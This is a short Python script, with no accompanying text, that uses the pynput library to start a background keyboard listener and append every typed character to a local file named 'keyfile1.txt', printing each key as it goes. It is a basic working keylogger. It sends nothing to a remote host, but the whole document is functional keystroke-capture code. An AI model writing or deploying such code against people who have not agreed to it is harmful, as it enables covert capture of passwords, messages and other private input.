from pynput import keyboard
def key_input(key):
    print(str(key))
    with open("keyfile1.txt","a") as log:
        try:
            char=key.char
            log.write(char)
        except:
            print("error\n")
if __name__=="__main__":
    listener=keyboard.Listener(on_press=key_input)
    listener.start()
    input()
    